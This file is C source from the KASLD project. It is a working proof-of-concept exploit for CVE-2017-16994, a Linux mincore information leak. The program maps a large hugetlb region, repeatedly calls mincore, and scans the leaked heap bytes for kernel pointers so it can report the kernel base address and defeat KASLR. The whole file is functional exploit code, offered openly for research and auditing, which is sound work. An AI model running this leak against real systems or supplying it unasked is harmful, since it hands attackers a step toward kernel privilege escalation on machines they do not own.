// This file is part of KASLD - https://github.com/bcoles/kasld
// mincore heap page disclosure (CVE-2017-16994)
// Largely based on original code by Jann Horn:
// - https://bugs.chromium.org/p/project-zero/issues/detail?id=1431

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/utsname.h>

// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;

struct utsname get_kernel_version() {
  struct utsname u;
  if (uname(&u) != 0) {
    printf("[-] uname(): %m\n");
    exit(1);
  }
  return u;
}

unsigned long get_kernel_addr_mincore() {
    unsigned char buf[getpagesize() / sizeof(unsigned char)];
    unsigned long iterations = 1000000;
    unsigned long addr = 0;

    /* A MAP_ANONYMOUS | MAP_HUGETLB mapping */
    if (mmap((void*)0x66000000, 0x20000000000, PROT_NONE,
          MAP_SHARED | MAP_ANONYMOUS | MAP_HUGETLB | MAP_NORESERVE, -1, 0) == MAP_FAILED) {
        printf("[-] mmap(): %m\n");
        return 0;
    }

    int i;
    for (i = 0; i <= iterations; i++) {
        /* Touch a mishandle with this type mapping */
        if (mincore((void*)0x86000000, 0x1000000, buf)) {
            printf("[-] mincore(): %m\n");
            return 0;
        }

        int n;
        for (n = 0; n < getpagesize() / sizeof(unsigned char); n++) {
            addr = *(unsigned long*)(&buf[n]);
            /* Kernel address space */
            if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX) {
                if (munmap((void*)0x66000000, 0x20000000000))
                    printf("[-] munmap(): %m\n");
                return addr;
            }
        }
    }

    if (munmap((void*)0x66000000, 0x20000000000))
      printf("[-] munmap(): %m\n");

    printf("[-] kernel base not found in mincore info leak\n");
    return 0;
}

int main (int argc, char **argv) {
  printf("[.] trying mincore info leak...\n");

  struct utsname u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    printf("[-] unsupported: system is not 64-bit.\n");
    exit(1);
  }

  unsigned long addr = get_kernel_addr_mincore();
  if (!addr) return 1;

  printf("leaked address: %lx\n", addr);

  if ((addr & 0xfffffffffff00000ul) == (addr & 0xffffffffff000000ul)) {
    printf("kernel base (likely): %lx\n", addr & 0xfffffffffff00000ul);
  } else {
    printf("kernel base (possible): %lx\n", addr & 0xfffffffffff00000ul);
    printf("kernel base (possible): %lx\n", addr & 0xffffffffff000000ul);
  }

  return 0;
}
